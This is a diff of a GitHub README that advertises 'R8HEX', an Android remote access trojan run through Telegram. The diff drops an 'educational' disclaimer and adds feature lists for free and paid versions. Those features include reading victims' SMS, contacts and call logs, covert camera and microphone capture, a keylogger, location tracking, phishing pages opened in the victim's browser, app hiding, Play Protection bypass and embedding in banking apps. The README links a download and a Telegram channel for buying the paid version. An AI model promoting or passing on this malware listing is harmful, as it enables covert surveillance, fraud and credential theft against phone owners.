@@ -1,72 +1,104 @@
-<div align="center">
-  
-  <img src="image/NU9.png" alt="Disclaimer" width="120" />
-
-  ## ⚠️ Important Disclaimer  
-  **This software/tool is strictly for Educational & Research purposes only.**  
-  The intention behind this project is to help **Cybersecurity Professionals, Students, and Researchers**  
-  understand how **Malware, RATs & Ransomware** operate so they can build stronger defenses.  
-
-  ---
-
-  <img src="image/SS.png" alt="Logo" width="200" />
-
-  ### 📱 A Flexible Android RAT integrated with Telegram (No Port Forwarding Needed)
-  **You can test Android Phones & Tablets.**  
-  🔗 Check full features by visiting the links below.
-
-  ---
-
-  <!-- 🚀 GitHub Badges -->
-  ![GitHub release (latest by date)](https://img.shields.io/github/v/release/Tocsiop/R8HEX?color=blue&label=Latest%20Release&style=for-the-badge)
-  ![GitHub stars](https://img.shields.io/github/stars/Tocsiop/R8HEX?style=for-the-badge&color=yellow)
-  ![GitHub forks](https://img.shields.io/github/forks/Tocsiop/R8HEX?style=for-the-badge&color=orange)
-  ![GitHub issues](https://img.shields.io/github/issues/Tocsiop/R8HEX?style=for-the-badge&color=red)
-  ![GitHub license](https://img.shields.io/github/license/Tocsiop/R8HEX?style=for-the-badge&color=green)
-
-  ---
-
-  <!-- 🎯 Custom Badges -->
-  ![Telegram](https://img.shields.io/badge/Telegram-Join%20Channel-blue?style=for-the-badge&logo=telegram)
-  ![Developer](https://img.shields.io/badge/Developer-FridayXD-green?style=for-the-badge&logo=github)
-  ![Version](https://img.shields.io/badge/Free%20Version-v1.2.0-yellow?style=for-the-badge)
-  ![Paid](https://img.shields.io/badge/Paid%20Version-Available-red?style=for-the-badge)
-
-</div>
+# 🚀 R8HEX RAT Features
 
 ---
 
-## 📸 Screenshots
-- [🔗 Panel Screenshot](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Panel_ss.md)
+## 🆓 Free Version (v1.2.0)
+
+### ✨ Features
+- 🔦 Torch On/Off  
+- 📳 Device Vibrate  
+- ✉️ Receive all SMS  
+- ✉️ Send SMS to any number (Fixed)  
+- ✉️ Send SMS with the target device to all contacts  
+- 👤 Receive all contacts  
+- 📷 Capture main & front camera  
+- 🎙 Capture microphone (custom duration)  
+- 👤 Receive all Call Logs  
+- 🔔 Notification reader  
+- 🗨️ Show Toast  
+- 🎧 Play Audio  
+- 🤖 Change Wallpaper (Free)  
+- 📋 Receive last clipboard text  
+- 📂 Get/Delete all files of device (Fixed)  
+- 📌 Premium UI/Attractive Looks (New)  
+
+> 🟢 These are all **Free Features** of R8HEX RAT.  
+> For more advanced features, check **Paid Version** below 👇  
 
 ---
 
-## 🎯 Versions
-- [🆓 Free Version v1.2.0](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Features.md)  
-- [💎 Paid Version](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Paid.md)
+## 💎 Paid Version (R8HEX BOT)
+
+### 🔓 Without Permission
+- 🔦 Torch On/Off  
+- 📱 Change Wallpaper  
+- ℹ️ Deep Device Information  
+- 📳 Device Vibrate  
+- 🗨️ Show Toast  
+- 🎧 Play Audio  
+- 📋 Receive last clipboard text  
+- 🎭 Change App Icon & Name (Hide App) **[NEW]**
 
 ---
 
-## ⚙️ How to Deploy
-- [📖 Deploy Free Version Guide](https://github.com/Tocsiop/R8HEX/blob/main/Readmds/Deployed.md)
+### 📱 With Normal Permission
+- ✉️ Receive all SMS + Sent SMS **[NEW]**  
+- ✉️ Send SMS to any number  
+- ✉️ Send SMS to all contacts  
+- 🗨️ Get Latest SMS only & forward to any number **[NEW]**  
+- 👤 Receive all contacts  
+- 📷 Capture main & front camera  
+- 🎙 Microphone capture (custom duration)  
+- 👤 Call Logs (Incoming/Outgoing) **[NEW]**  
+- 🔔 Notification reader  
+- 🛰️ Device location tracking  
+- 🔐 Open phishing page in victim browser **[NEW]**  
+- 📒 Gallery puller (Get all photos)  
+- 🔔 Custom notification sender (with custom click link)
 
 ---
 
-## ⬇️ Download
-- [📂 Download Free Version v1.2.0](https://github.com/Tocsiop/R8HEX/archive/refs/tags/V1.2.0-R8HEX.zip)
+### 🖥️ With Accessibility Permission
+- 🔐 Keylogger  
+- 🖥️ Screenshot capture  
+- 🤖 Auto Permission (on order)  
+- 📁 Powerful File Manager  
 
 ---
 
-## 📢 Join Community
-- [🚀 Join Telegram Channel](https://telegram.me/r8hex)  
-- [👨‍💻 Developer](https://telegram.me/fridayxd)
+## 🛠️ Custom Modification
+- 🔴 Can be added in any app source code  
+- 🔴 Impossible to hack bot  
+- 🔴 Multiple Telegram Bots supported  
+- 🔴 Works with Banking, Social Media & Study apps **[NEW]**  
+- 🔴 Unlimited IDs & Groups support **[NEW]**  
+- 🔴 Hosting supported on Glitch / Render / Heroku / Replit  
 
 ---
 
-<div align="center">
+## 🌍 Common (Free + Paid)
+- 🔴 Real-time Details  
+- 🌐 Custom Web Panel  
+- ♥ Support for any app interface  
+- 🤖 Play Protection Bypass  
+- ⚡ More features coming soon...
 
-### 🛡️ Disclaimer  
-This repository is only for **educational awareness**.  
-The author is **not responsible** for any misuse of this project.  
+---
 
-</div>
+## 📥 Download & Buy
+
+- 🆓 [**Download Free Files v1.2.0**](https://github.com/Tocsiop/R8HEX/archive/refs/tags/V1.2.0-R8HEX.zip)  
+
+- 💎 [**Get Paid Version on Telegram**](https://t.me/R8HEX)  
+
+---
+
+## 📢 Contact & Updates
+
+<a href="https://t.me/fridayxd">
+  <img src="https://img.shields.io/badge/CONTACT-DEVELOPER-blue?style=for-the-badge&logo=telegram" />
+</a>
+
+<a href="https://t.me/R8HEX">
+  <img src="https://img.shields.io/badge/JOIN-UPDATE%20CHANNEL-blue?style=for-the-badge&logo=telegram" />
+</a>
